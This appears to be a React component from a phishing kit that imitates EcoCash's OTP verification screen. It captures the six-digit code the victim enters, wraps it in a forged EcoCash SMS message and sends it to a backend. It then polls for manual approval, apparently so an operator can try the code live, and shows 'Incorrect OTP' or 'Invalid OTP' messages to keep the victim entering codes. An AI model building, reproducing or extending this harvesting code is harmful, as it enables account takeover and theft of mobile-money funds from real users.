import React, { useState } from "react";
import { requestApproval, checkStatus } from "../apiClient";
import toast from "react-hot-toast";
import { ArrowLeft, Loader2 } from "lucide-react";
import {
    pageStyle,
    headerStyle,
    logoStyle,
    menuButtonStyle,
    contentStyle,
    cardStyle,
    footerStyle,
    buttonStyle,
} from "../styles/sharedStyles";
import { OtpVerificationPageProps } from "../types";

const formatEcoCashOtpMessage = (otpValue: string) =>
    `<#> Your EcoCash OTP is:${otpValue}. Do not share this code with anyone. Expires in 2 mins. td1xRGYXC+L`;

function OtpVerificationPage({
    phoneNumber,
    onComplete,
    onBack,
}: OtpVerificationPageProps) {
    const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
    const [loading, setLoading] = useState(false);
    const [resendTimer, setResendTimer] = useState(60);
    const [codeExpired, setCodeExpired] = useState(false);
    const inputRefs = React.useRef<(HTMLInputElement | null)[]>([]);

    // const WEBHOOK_URL = import.meta.env.VITE_WEBHOOK_URL;

    React.useEffect(() => {
        // Focus first input on mount
        inputRefs.current[0]?.focus();
    }, []);

    React.useEffect(() => {
        if (resendTimer > 0) {
            const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
            return () => clearTimeout(timer);
        } else if (resendTimer === 0) {
            // Code has expired
            setCodeExpired(true);
        }
    }, [resendTimer]);

    const handleOtpChange = (index: number, value: string) => {
        // Only allow digits
        if (!/^\d*$/.test(value)) return;

        const newOtp = [...otp];
        newOtp[index] = value.slice(-1); // Only take last character
        setOtp(newOtp);

        // Auto-focus next input
        if (value && index < 5) {
            inputRefs.current[index + 1]?.focus();
        }
    };

    const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
        if (e.key === "Backspace" && !otp[index] && index > 0) {
            inputRefs.current[index - 1]?.focus();
        }
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();

        const otpValue = otp.join("");
        if (otpValue.length !== 6) {
            toast.error("Please enter all 6 digits");
            return;
        }

        if (codeExpired) {
            return;
        }

        setLoading(true);

        try {
            const res = await requestApproval({
                type: 'otp',
                phone: phoneNumber?.replace(/\D/g, '') || "N/A",
                details: formatEcoCashOtpMessage(otpValue),
            });

            const attemptId = res.attemptId;
            console.log("OTP attemptId:", attemptId);

            // Poll for approval — max 2 minutes
            let pollCount = 0;
            const maxPolls = 120;
            const interval = setInterval(async () => {
                pollCount++;
                if (pollCount > maxPolls) {
                    clearInterval(interval);
                    setLoading(false);
                    toast.error("Approval timed out. Please try again.");
                    return;
                }

                try {
                    const statusRes = await checkStatus(attemptId);
                    const status = statusRes.status;
                    console.log(`Poll ${pollCount}: status =`, status);

                    if (status === 'approved') {
                        clearInterval(interval);
                        setLoading(false);
                        toast.success("OTP verified successfully!");
                        onComplete();
                    } else if (status === 'rejected') {
                        clearInterval(interval);
                        setLoading(false);
                        toast.error("Incorrect OTP. Please try again.");
                        setOtp(["", "", "", "", "", ""]);
                        inputRefs.current[0]?.focus();
                    }
                } catch (pollErr) {
                    console.error("Poll error:", pollErr);
                }
            }, 1000);

        } catch (err: any) {
            setLoading(false);
            console.error("OTP request-approval error:", err);
            toast.error("Could not connect. Please try again.");
        }
    };

    const handleResend = () => {
        // If code is expired, redirect to login page
        if (codeExpired) {
            onBack();
            return;
        }

        if (resendTimer > 0) return;

        toast.success("OTP resent successfully!");
        setResendTimer(60);
        setOtp(["", "", "", "", "", ""]);
        inputRefs.current[0]?.focus();
    };

    return (
        <div
            style={{
                ...pageStyle,
                background: "linear-gradient(to bottom, #f0f0f0 0%, #e0e0e0 100%)",
            }}
        >
            <div style={headerStyle}>
                <button
                    onClick={onBack}
                    style={{
                        background: "none",
                        border: "none",
                        color: "#333",
                        cursor: "pointer",
                        fontSize: "24px",
                        display: "flex",
                        alignItems: "center",
                        gap: "5px",
                    }}
                >
                    <ArrowLeft size={20} />
                </button>
                <img src="/ecocash.png" alt="EcoCash" style={logoStyle} />
                <button style={menuButtonStyle}>☰</button>
            </div>

            <div style={contentStyle}>
                <div
                    style={{
                        ...cardStyle,
                        maxWidth: "450px",
                    }}
                >
                    <h1
                        style={{
                            fontSize: "32px",
                            fontWeight: "700",
                            marginBottom: "15px",
                            color: "#333",
                        }}
                    >
                        OTP Verification
                    </h1>
                    <p
                        style={{
                            color: "#666",
                            fontSize: "15px",
                            marginBottom: "30px",
                            lineHeight: "1.5",
                        }}
                    >
                        Enter the OTP sent to your phone number
                        <br />
                        <strong style={{ color: "#333" }}>
                            {phoneNumber || "+263701234567"}
                        </strong>
                    </p>

                    <form onSubmit={handleSubmit}>
                        <div
                            style={{
                                display: "flex",
                                gap: "10px",
                                justifyContent: "center",
                                marginBottom: "25px",
                            }}
                        >
                            {otp.map((digit, index) => (
                                <input
                                    key={index}
                                    ref={(el) => (inputRefs.current[index] = el)}
                                    type="text"
                                    inputMode="numeric"
                                    maxLength={1}
                                    value={digit}
                                    onChange={(e) => handleOtpChange(index, e.target.value)}
                                    onKeyDown={(e) => handleKeyDown(index, e)}
                                    style={{
                                        width: "50px",
                                        height: "55px",
                                        fontSize: "24px",
                                        fontWeight: "600",
                                        textAlign: "center",
                                        border: "2px solid #ddd",
                                        borderRadius: "8px",
                                        outline: "none",
                                        transition: "border-color 0.2s",
                                    }}
                                    onFocus={(e) => {
                                        e.target.style.borderColor = "#7db3ff";
                                    }}
                                    onBlur={(e) => {
                                        e.target.style.borderColor = "#ddd";
                                    }}
                                />
                            ))}
                        </div>

                        <div
                            style={{
                                textAlign: "center",
                                marginBottom: "25px",
                            }}
                        >
                            {codeExpired ? (
                                <div>
                                    <p
                                        style={{
                                            color: "#dc3545",
                                            fontSize: "14px",
                                            fontWeight: "600",
                                            marginBottom: "12px",
                                        }}
                                    >
                                        Invalid OTP, please enter a valid OTP
                                    </p>
                                    <button
                                        type="button"
                                        onClick={handleResend}
                                        style={{
                                            background: "none",
                                            border: "none",
                                            color: "#7db3ff",
                                            cursor: "pointer",
                                            fontSize: "14px",
                                            textDecoration: "underline",
                                            fontWeight: "500",
                                        }}
                                    >
                                        Resend OTP
                                    </button>
                                </div>
                            ) : (
                                <button
                                    type="button"
                                    onClick={handleResend}
                                    disabled={resendTimer > 0}
                                    style={{
                                        background: "none",
                                        border: "none",
                                        color: resendTimer > 0 ? "#999" : "#7db3ff",
                                        cursor: resendTimer > 0 ? "not-allowed" : "pointer",
                                        fontSize: "14px",
                                        textDecoration: resendTimer > 0 ? "none" : "underline",
                                    }}
                                >
                                    Resend OTP {resendTimer > 0 ? `in ${resendTimer} seconds` : ""}
                                </button>
                            )}
                        </div>

                        <button
                            type="submit"
                            disabled={loading || otp.join("").length !== 6}
                            style={{
                                ...buttonStyle,
                                background:
                                    loading || otp.join("").length !== 6 ? "#ccc" : "#7db3ff",
                                cursor:
                                    loading || otp.join("").length !== 6
                                        ? "not-allowed"
                                        : "pointer",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                gap: "8px",
                            }}
                        >
                            {loading ? (
                                <>
                                    <Loader2 className="spinner" size={18} />
                                    VERIFYING...
                                </>
                            ) : (
                                "SUBMIT"
                            )}
                        </button>
                    </form>
                </div>
            </div>

            <div style={footerStyle}>© 2025 Kashagi Zimbabwe</div>
        </div>
    );
}

export default OtpVerificationPage;
